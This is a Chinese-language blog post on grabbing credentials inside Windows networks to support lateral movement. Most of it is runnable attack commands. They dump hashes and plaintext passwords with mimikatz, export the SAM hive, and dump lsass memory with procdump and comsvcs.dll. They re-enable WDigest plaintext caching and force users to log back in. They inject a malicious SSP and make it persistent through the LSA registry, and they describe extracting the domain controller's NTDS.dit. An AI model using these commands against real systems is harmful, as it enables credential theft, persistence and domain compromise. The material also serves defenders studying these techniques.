@@ -1,0 +1,470 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>内网密码抓取技术 | Drblack'Blog</title><meta name="author" content="Drblack"><meta name="copyright" content="Drblack"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="重要性内网密码技术抓取决定了后续的横向成功与否 抓取密码种类 1234561. 本地账号密码（或者hash）2. 域账号密码（或者hash）3. RDP账号密码4. 浏览器账号密码5. 数据库账号密码6. 本地保存账号密码文件  抓取工具 简单列举 1231. mimikatz2. invoke-Mimikatz.ps13. CS.MSF自带  mimikatz命令Mimikatz提权后才能使用更">
+<meta property="og:type" content="article">
+<meta property="og:title" content="内网密码抓取技术">
+<meta property="og:url" content="https://drblack.top/2023/10/31/%E5%86%85%E7%BD%91%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/index.html">
+<meta property="og:site_name" content="Drblack&#39;Blog">
+<meta property="og:description" content="重要性内网密码技术抓取决定了后续的横向成功与否 抓取密码种类 1234561. 本地账号密码（或者hash）2. 域账号密码（或者hash）3. RDP账号密码4. 浏览器账号密码5. 数据库账号密码6. 本地保存账号密码文件  抓取工具 简单列举 1231. mimikatz2. invoke-Mimikatz.ps13. CS.MSF自带  mimikatz命令Mimikatz提权后才能使用更">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://drblack.top/img/1000.webp">
+<meta property="article:published_time" content="2023-10-31T03:20:41.000Z">
+<meta property="article:modified_time" content="2023-10-31T03:29:07.095Z">
+<meta property="article:author" content="Drblack">
+<meta property="article:tag" content="知识点">
+<meta property="article:tag" content="内网攻防">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://drblack.top/img/1000.webp"><link rel="shortcut icon" href="/img/1000.webp"><link rel="canonical" href="https://drblack.top/2023/10/31/%E5%86%85%E7%BD%91%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="8KYdLccZEOQiOgJvHftvX7-2pkkmhBMvMXO4inbIkLw"/><meta name="baidu-site-verification" content="codeva-t56Dl5qqYL"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '内网密码抓取技术',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-10-31 11:29:07'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/custom.css" media="defer" onload="this.media='all'"><meta name="generator" content="Hexo 6.3.0"></head><body><script>window.paceOptions = {
+  restartOnPushState: false
+}
+
+document.addEventListener('pjax:send', () => {
+  Pace.restart()
+})
+</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/pace-js/themes/blue/pace-theme-minimal.min.css"/><script src="https://cdn.jsdelivr.net/npm/pace-js/pace.min.js"></script><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/1000.webp" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">12</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">4</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首頁</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 時間軸</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 標籤</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分類</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> 清單</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音樂</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 電影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友鏈</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 關於</span></a></div><div class="menus_item"><a class="site-page" href="/sitemap.xml"><i class="fa-fw sitemap"></i><span> sitemap</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="Drblack'Blog"><span class="site-name">Drblack'Blog</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首頁</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 時間軸</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 標籤</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分類</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> 清單</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音樂</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 電影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友鏈</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 關於</span></a></div><div class="menus_item"><a class="site-page" href="/sitemap.xml"><i class="fa-fw sitemap"></i><span> sitemap</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">内网密码抓取技术</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-10-31T03:20:41.000Z" title="发表于 2023-10-31 11:20:41">2023-10-31</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-10-31T03:29:07.095Z" title="更新于 2023-10-31 11:29:07">2023-10-31</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">3.9k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>13分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="内网密码抓取技术"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="重要性"><a href="#重要性" class="headerlink" title="重要性"></a>重要性</h1><p>内网密码技术抓取决定了后续的横向成功与否</p>
+<p><strong>抓取密码种类</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1. 本地账号密码（或者hash）</span><br><span class="line">2. 域账号密码（或者hash）</span><br><span class="line">3. RDP账号密码</span><br><span class="line">4. 浏览器账号密码</span><br><span class="line">5. 数据库账号密码</span><br><span class="line">6. 本地保存账号密码文件</span><br></pre></td></tr></table></figure>
+
+<p><strong>抓取工具</strong></p>
+<p>简单列举</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. mimikatz</span><br><span class="line">2. invoke-Mimikatz.ps1</span><br><span class="line">3. CS.MSF自带</span><br></pre></td></tr></table></figure>
+
+<h1 id="mimikatz命令"><a href="#mimikatz命令" class="headerlink" title="mimikatz命令"></a>mimikatz命令</h1><p>Mimikatz提权后才能使用更多功能</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">mimikatz 很多模块需要高权限运行，因此执行高权限操作模块的时候需要先利用 privilege 模块进行提权。该命令用于提权，普通用户权限执行该提权命令会失败，管理员权限才能成功</span></span><br><span class="line">sekurlsa::msv </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">获取HASH (LM,NTLM)</span></span><br><span class="line">sekurlsa::wdigest</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">通过可逆的方式去内存中读取明文密码</span></span><br><span class="line">sekurlsa::Kerberos</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">获取域管理员的明文密码</span></span><br><span class="line">sekurlsa::tspkg</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">通过tspkg读取明文密码</span></span><br><span class="line">sekurlsa::livessp </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">通过livessp 读取明文密码</span></span><br><span class="line">sekurlsa::ssp </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">通过ssp 读取明文密码</span></span><br><span class="line">sekurlsa::logonPasswords </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">通过以上各种方法抓取内存中保存的用户所有凭据</span></span><br><span class="line">misc::memssp</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">ssp注入内存</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="密码抓取原理"><a href="#密码抓取原理" class="headerlink" title="密码抓取原理"></a>密码抓取原理</h1><ol>
+<li><p>读SAM文件</p>
+</li>
+<li><p>利用Lsass.exe进程</p>
+</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SAM文件中保存的是本地用户的HASH值，一般不允许读、写</span><br><span class="line"></span><br><span class="line">在登录认证阶段， Lsass.exe会将用户明文账户密码存一份在本地，并且与SAM文件内的账号密码作对比</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20231026105808635.png" alt="image-20231026105808635"></p>
+<h2 id="在线读SAM中HASH"><a href="#在线读SAM中HASH" class="headerlink" title="在线读SAM中HASH"></a>在线读SAM中HASH</h2><p><strong>在线读取</strong>：在对方电脑上读取。</p>
+<p><strong>读取方法</strong>：利用mimikatze读取，高权限用户下才可以读取SAM文件，如：Administrator，System，过了UAC认证的管理员</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">privilege:debug</span><br><span class="line">token::elevate</span><br><span class="line">lsadump::sam</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">分开输入</span></span><br><span class="line"></span><br><span class="line">mimikatze.exe &quot;privilege:debug&quot; &quot;token::elevate&quot; &quot;lsadump::sam&quot; &quot;exit&quot;</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">连起来输入</span></span><br><span class="line"></span><br><span class="line">CS中 目标-转储HASH</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20231026111753054.png" alt="image-20231026111753054"></p>
+<p><strong>优点</strong>：方便快捷</p>
+<p><strong>缺点</strong>：mimikatze容易被杀</p>
+<h2 id="离线读取SAM中HASH"><a href="#离线读取SAM中HASH" class="headerlink" title="离线读取SAM中HASH"></a>离线读取SAM中HASH</h2><p><strong>离线读取</strong>：将sam文件下载下来后利用mimikatze进行读取。</p>
+<p><strong>导出方法</strong>：</p>
+<ol>
+<li>通过reg命令导出</li>
+</ol>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">reg save hklm\sam sam.hive</span><br><span class="line">reg save hklm\system system.hive</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">reg是操作注册表命令</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20231026113035157.png" alt="image-20231026113035157"></p>
+<ol start="2">
+<li>使用Powershell脚本导出</li>
+</ol>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">powershell-import Copy-vss.ps1</span><br><span class="line">powershell Copy-VSS</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">不需要上传到对方机器，只需要上传到CS目录中运行即可</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>读取文件</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::sam /sam:sam.hive /system:system.hive</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20231026113933552.png" alt="image-20231026113933552"></p>
+<p><strong>优点</strong>：不易被查杀</p>
+<p><strong>缺点</strong>：操作比较复杂</p>
+<h2 id="在线读取Lsass进程内存密码"><a href="#在线读取Lsass进程内存密码" class="headerlink" title="在线读取Lsass进程内存密码"></a>在线读取Lsass进程内存密码</h2><p>在目标机器上直接读取lsass.exe内存到<strong>明文</strong>账号密码。</p>
+<p>mimikatz</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::msv </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">获取HASH (LM,NTLM)</span></span><br><span class="line">sekurlsa::wdigest</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">通过可逆的方式去内存中读取明文密码</span></span><br><span class="line">sekurlsa::Kerberos</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">获取域管理员的明文密码</span></span><br><span class="line">sekurlsa::tspkg</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">通过tspkg读取明文密码</span></span><br><span class="line">sekurlsa::livessp </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">通过livessp 读取明文密码</span></span><br><span class="line">sekurlsa::ssp </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">通过ssp 读取明文密码</span></span><br><span class="line">sekurlsa::logonPasswords</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">用以上所有方法获取凭证信息</span></span><br></pre></td></tr></table></figure>
+
+<p>缺点：上传工具容易被杀</p>
+<h2 id="离线读取Lsass进程内存密码"><a href="#离线读取Lsass进程内存密码" class="headerlink" title="离线读取Lsass进程内存密码"></a>离线读取Lsass进程内存密码</h2><p>原理与离线读取SAM文件读取相同</p>
+<p><strong>导出方法</strong></p>
+<ol>
+<li><strong>远程桌面通过任务管理器导出</strong></li>
+</ol>
+<p><img src="/images/image-20231026143434011.png" alt="image-20231026143434011"></p>
+<p><img src="/images/image-20231026143543742.png" alt="image-20231026143543742"></p>
+<ol start="2">
+<li><strong>使用procdump导出lsass.dmp文件</strong></li>
+</ol>
+<p>Procdump是用于管理员或开发人员确定峰值原因的cpu监视工具。有些杀软还是会杀</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">procdump.exe -accepteula -ma lsass.exe lsass.dmp</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">-accepteula用于过滤掉弹窗</span></span><br></pre></td></tr></table></figure>
+
+<p>在命令行运行时无法点击弹窗，所以需要添加参数-accepteula</p>
+<p><img src="/images/image-20231026144220632.png" alt="image-20231026144220632"></p>
+<ol start="3">
+<li><strong>使用powershell Out-MiniDump.ps1脚本</strong></li>
+</ol>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">powershell-import Out-MiniDump.ps1</span><br><span class="line">powershell Get-Process lsass | Out-Minidump</span><br></pre></td></tr></table></figure>
+
+<p>脚本放置在cs目录下导入后使用</p>
+<ol start="4">
+<li><strong>使用系统自带comsvcs.dll，通过comsvcs.dll的导出函数MiniDump实现dump内存</strong></li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">命令：</span><br><span class="line">1、首先查看lsass.exe进程PID: tasklist | findstr lsass.exe</span><br><span class="line"></span><br><span class="line">2、使用powershell导出rundll32 C:\windows\system32\comsvcs.dll</span><br><span class="line">MiniDump 476 C:\Users\Administrator\Desktop\lsass.dmp full</span><br></pre></td></tr></table></figure>
+
+<p><strong>读取方法</strong></p>
+<ol>
+<li><strong>使用mimikatz对导出lsass.dmp文件进行读取</strong></li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="高版本明文密码抓取"><a href="#高版本明文密码抓取" class="headerlink" title="高版本明文密码抓取"></a>高版本明文密码抓取</h1><p>Win7、 Win2008这样的机器内存中是存储明文的密码，但是在2012之后的机器（win10、win 8、win11、</p>
+<p>2012、2016）或者安装了KB2971997补丁是内存中就不在存储明文的密码了，我们无法通过上述的方法</p>
+<p>抓取到明文的密码。</p>
+<p>如win10中，只有NTML hash，通过mimikatz无法直接抓到明文</p>
+<p><img src="/images/image-20231028170631397.png" alt="image-20231028170631397"></p>
+<p>Win11暂时不能抓到</p>
+<p><img src="/images/image-20231026154708706.png" alt="image-20231026154708706"></p>
+<p>但是可以抓取sam文件</p>
+<p><img src="/images/image-20231026154751957.png" alt="image-20231026154751957"></p>
+<p><strong>获取明文密码方法</strong></p>
+<h2 id="修改Wdigest注册表"><a href="#修改Wdigest注册表" class="headerlink" title="修改Wdigest注册表"></a><strong>修改Wdigest注册表</strong></h2><p>在Windows2012系统及以上的系统，默认在内存缓存中禁止保存明文密码的。攻击者可以通过</p>
+<p>修改注册表的方式抓取明文，需要用户重新登录后才能成功抓取。</p>
+<p>步骤：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1.先查询一下是否存在该值 </span><br><span class="line">reg query &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest&quot; /V UseLogonCredential</span><br><span class="line"></span><br><span class="line">2.修改UseLogonCredential值为1，这里注意一定要是最高管理员权限</span><br><span class="line">reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</span><br><span class="line"></span><br><span class="line">3.现在内存中就可以存储明文的密码了，但是因为密码在内存中，需要锁屏或者注销用户然后重新登录后，内存中就保留密码了</span><br><span class="line"></span><br><span class="line">rundll32.exe user32.dll,LockWorkStation #锁屏</span><br><span class="line">query user #查询登录 </span><br><span class="line">logoff ID #注销用户  </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">如果锁屏后仍然未抓到，尝试注销用户测试</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20231028171242725.png" alt="image-20231028171242725"></p>
+<p>这里注意，<strong>必须要最高管理员用户重新登录才能抓取</strong>，普通用户重新登录后也是抓不到的！</p>
+<p><img src="/images/image-20231028175110713.png" alt="image-20231028175110713"></p>
+<h2 id="SSP注入内存获取系统密码"><a href="#SSP注入内存获取系统密码" class="headerlink" title="SSP注入内存获取系统密码"></a>SSP注入内存获取系统密码</h2><p>Lsass.exe在执行的时候会加载ssp，通过写入恶意ssp，让系统执行ssp记录密码。</p>
+<p>Mimikatz中，有写好的恶意的SSP，他可以提供本地认证时候对明文账号密码进行记</p>
+<p>录，我们需要将SSP注入到系统内存中，就可以获取本地的明文账号密码。因为是注</p>
+<p>入内存所以<strong>重启后就失效</strong>了，这个攻击也叫 （SSP注入）</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">第一步：mimikatz misc::memssp</span><br><span class="line">第二步：锁屏或者注销用户</span><br><span class="line">第三步：找到c:\windows\system32\mimilsa.log文件，其中是记录的账户和密码</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20231029142012114.png" alt="image-20231029142012114"></p>
+<p><img src="/images/image-20231029142401772.png" alt="image-20231029142401772"></p>
+<p>如果<strong>找不到mimilsa.log文件</strong>：因为权限问题需要进入电脑系统中去找，不能通过shell看。</p>
+<p>解决方法：</p>
+<ol>
+<li><strong>计划任务</strong>：复制文件到另一个地方（如：copy到桌面）</li>
+</ol>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo copy c:\windows\system32\mimilsa.log c:\users\administrator\desktop\1.txt &gt; 1.bat</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20231029143119752.png" alt="image-20231029143119752"></p>
+<p><img src="/images/image-20231029143234929.png" alt="image-20231029143234929"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">schtasks /create /tn 任务名 /sc onstart /tr c:\users\administrator\desktop\1.bat /ru system /f</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">创建copy计划任务</span></span><br><span class="line">schtasks /run /i /tn &quot;copy&quot;</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">执行copy计划任务</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20231029143709514.png" alt="image-20231029143709514"></p>
+<ol start="2">
+<li><strong>将文件发送到远端服务器</strong></li>
+</ol>
+<h2 id="SSP注入注册表"><a href="#SSP注入注册表" class="headerlink" title="SSP注入注册表"></a>SSP注入注册表</h2><p><strong>永久生效</strong>就需要将SSP添加到注册表中，之后系统重启就会加载SSP，这样就会获取明文账号密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">一、第一步:在Mimikatz中有一个mimilib.dll文件，这个就是SSP,将这个文件复制到</span><br><span class="line">C:\Windows\System32目录下</span><br><span class="line"></span><br><span class="line">二、第二步:修改注册表，重启后就会加载SSP</span><br><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v &quot;Security Packages&quot; /t REG_MULTI_SZ /d mimilib.dll /f</span><br><span class="line"></span><br><span class="line">三、密码将会生成在C:\Windows\System32\kiwissp.log</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20231029152633034.png" alt="image-20231029152633034"></p>
+<p>注意几个问题：重启后shell可能会断开，考虑计划任务重新连接。</p>
+<h1 id="抓取域控上的账号密码"><a href="#抓取域控上的账号密码" class="headerlink" title="抓取域控上的账号密码"></a>抓取域控上的账号密码</h1><p><strong>NTDS.DIT为DC的数据库</strong>，内容有域用户、域组、用户hash等信息，域控上的ntds.dit只有可以</p>
+<p>登录到域控的用户（如域管用户、DC本地管理员用户）可以访问,为了进一步保护密码哈希值，</p>
+<p>使用存储在SYSTEM注册表配置单元中的密钥对这些哈希值进行加密。</p>
+<p><strong>(SAM中存的域控的本地账户密码，NTD中存的是整个域所有用户账户密码)</strong></p>
+<p><img src="/images/image-20231029153753531.png" alt="image-20231029153753531"></p>
+<p>1、离线读取，将NTDS文件复制到攻击者的本地，然后使用工具读取</p>
+<p>2、在线读取，通过给域控的电脑上传读取的工具，进行在线读取</p>
+<p>3、远程读取，不需要上线域控，可以通过Dcsync远程读取</p>
